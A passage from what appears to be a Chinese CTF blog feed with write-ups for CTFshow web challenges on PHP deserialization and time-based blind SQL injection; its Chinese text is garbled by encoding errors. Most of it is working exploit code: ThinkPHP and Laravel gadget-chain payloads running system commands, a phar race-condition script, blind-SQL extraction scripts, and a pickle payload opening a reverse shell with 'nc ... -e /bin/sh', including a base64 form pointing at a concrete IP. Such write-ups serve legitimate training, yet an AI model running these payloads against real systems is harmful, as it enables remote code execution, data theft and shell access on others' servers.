class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A43%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockConfiguration%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>feng%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>Bexit%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><blockquote><p><a href="https://xz.aliyun.com/t/6619#toc-1">https://xz.aliyun.com/t/6619#toc-1</a></p></blockquote><h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><p>è€é¡¾å®¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>; <span class="comment">//PHPå‡½æ•°</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>]; <span class="comment">//PHPå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?lin=cat /f*&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br></pre></td></tr></table></figure><p>linä¸­ä¼ å…¥å‘½ä»¤ï¼Œdataä¼ å…¥ååºåˆ—åŒ–<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690629861855-a14768bf-7926-4b4e-8c0a-4e9fd1154539.png" alt="image.png"></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>__destruct</code>å½“å¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦ç”¨åˆ°ååºåˆ—åŒ–å‡½æ•°ã€‚é‚£ä¹ˆåªè¦<code>$this-&gt;evilfile</code>æ˜¯trueå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ã€‚<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=</span>;cat f*</span><br><span class="line">post: flag=<span class="number">123</span></span><br></pre></td></tr></table></figure><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p></blockquote><h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><p>æ™šä¸ŠæŒºä¸ä½ï¼Œæ”¾ä¸€ä¸‹åˆ«äººpayloadï¼š<br>åœ¨ä¸Šä¸ªé¢˜çš„åŸºç¡€ä¸Šå¢äº†äº† åˆ¤æ–­$this-&gt;adminæ‰€ä»¥çœŸçš„éœ€è¦æˆ‘ä»¬å»é€šè¿‡ååºåˆ—åŒ–ä¿®æ”¹adminçš„å€¼äº†ã€‚å› ä¸ºé¢˜ç›®ä¸­æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼ã€‚<br>å› ä¸ºé¢˜ç›®ä¸­æœ‰å†™æ–‡ä»¶çš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡file_put_contentså†™pharæ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡file_put_contentsè§¦å‘pharååºåˆ—åŒ–ã€‚å½“ç„¶æˆ‘ä»¬å¾—åœ¨åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œå®Œè¿™ä¸¤ä¸ªæ“ä½œï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ã€‚<br>ç”Ÿæˆpharï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;1|cat f*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¡ä»¶ç«äº‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import base64</span><br><span class="line">url = <span class="string">&#x27;http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="title function_ invoke__">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">flag = False</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">work1</span>():</span><br><span class="line">    requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?fn=a&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">work2</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?fn=phar://phar.phar/&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> in r.text <span class="keyword">and</span> flag is False:</span><br><span class="line">        <span class="keyword">print</span>(base64.<span class="title function_ invoke__">b64encode</span>(r.text.<span class="title function_ invoke__">encode</span>()))</span><br><span class="line">        flag = True</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag is False:</span><br><span class="line">    a = threading.<span class="title function_ invoke__">Thread</span>(target=work1)</span><br><span class="line">    b = threading.<span class="title function_ invoke__">Thread</span>(target=work2)</span><br><span class="line">    a.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    b.<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web277ã€web278"><a href="#web277ã€web278" class="headerlink" title="web277ã€web278"></a>web277ã€web278</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class"><span class="title">return</span>(<span class="title">eval</span>,(&#x27;<span class="title">__import__</span>(&quot;<span class="title">os</span>&quot;).<span class="title">popen</span>(&quot;<span class="title">nc</span> <span class="title">xxx</span>.<span class="title">xxx</span>.<span class="title">xxx</span>.<span class="title">xxx</span> 4567 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">sh</span>&quot;).<span class="title">read</span>()&#x27;,))</span></span><br><span class="line"><span class="class"><span class="title">a</span>=<span class="title">A</span>()</span></span><br><span class="line"><span class="class"><span class="title">test</span>=<span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">base64</span>.<span class="title">b64encode</span>(<span class="title">test</span>))</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/backdoor?data=gASVXwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxDX19pbXBvcnRfXygib3MiKS5wb3BlbigibmMgMTAxLjIwMC4xNTkuMTE5IDg4ODggLWUgL2Jpbi9zaCIpLnJlYWQoKZSFlFKULg==</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690630246109-15f492ce-0561-499f-9588-24e51f9017a4.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web214-web253SQLæ³¨å…¥ç¯‡ï¼ˆä¸‰ï¼‰</title>
      <link href="/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>ç»ˆäºçŸ¥é“æ˜¯å“ªæ¥çš„æ³¨å…¥ç‚¹äº†ï¼Œåœ¨ä¸»é¡µçš„ç½‘ç»œåŒ…ä¸­æœ‰ä¸€ä¸ª<code>select.js</code>ä¸­èƒ½çœ‹åˆ°ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(<span class="punctuation">&#123;</span></span><br><span class="line">  url<span class="punctuation">:</span>&#x27;api/&#x27;<span class="punctuation">,</span></span><br><span class="line">  dataType<span class="punctuation">:</span><span class="string">&quot;json&quot;</span><span class="punctuation">,</span></span><br><span class="line">  type<span class="punctuation">:</span>&#x27;post&#x27;<span class="punctuation">,</span></span><br><span class="line">  data<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    ip<span class="punctuation">:</span>returnCitySN<span class="punctuation">[</span><span class="string">&quot;cip&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    debug<span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span>);</span><br></pre></td></tr></table></figure><p>å‘å…¶ä¸­å¯ä»¥å­˜åœ¨æ³¨å…¥ç‚¹ã€‚<br>hackbaræµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282687265-a4a97ad1-82db-4165-ba3f-d36f1b9c060b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282697392-c201a11b-9f33-4447-837e-6f89afbcd904.png" alt="image.png"><br>æœ‰sqlæ‰§è¡Œï¼Œç»§ç»­æ„å»ºæµ‹è¯•payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=if(substr(database(),1,1)=(&#x27;c&#x27;),sleep(5),1)&amp;debug=0</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å†™è„šæœ¬<br>å…ˆè´´ä¸€ä¸‹ä½¬ä»¬çš„è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">Author:Y4tacker</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # æŸ¥æ•°æ®åº“</span><br><span class="line">        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">        # æŸ¥åˆ—åå­—-id.flag</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span><br><span class="line">        # æŸ¥æ•°æ®</span><br><span class="line">        payload = &quot;select flaga from ctfshow_flagx&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;ip&#x27;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,</span><br><span class="line">            &#x27;debug&#x27;:&#x27;0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=1)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>æˆ‘çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6ec95228-b921-42dc-ba05-78d8a7decd79.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagx&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flaga) from ctfshow_flagx&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),sleep(1),1)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># çœ‹äº†Y4tackerä½¬çš„wpï¼Œçœ‹åˆ°è¿™ç§å†™æ³•ï¼Œè§‰å¾—å¤ªå¦™äº†ã€‚ç”¨tryæ¥å¾®è°ƒ</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>substrè¿™ä¸ªå‡½æ•°ä¸ä»0å¼€å§‹ï¼Œä»1å¼€å§‹ã€‚åˆ«å‚»ä¹ä¹çš„ç”¨é”™äº†ã€‚<br>å¯ä»¥ç”¨tryæ¥åšä¸€ä¸ªå¾®è°ƒï¼Œå¦‚æœå‡ºç°é—®é¢˜å°±å¯ä»¥è‡ªå·±ä¿®æ”¹ã€‚<br>æ³¨æ„è¦ä¼ çš„æ˜¯<code>/api/</code>ä¸æ˜¯<code>/api</code>ä¼ 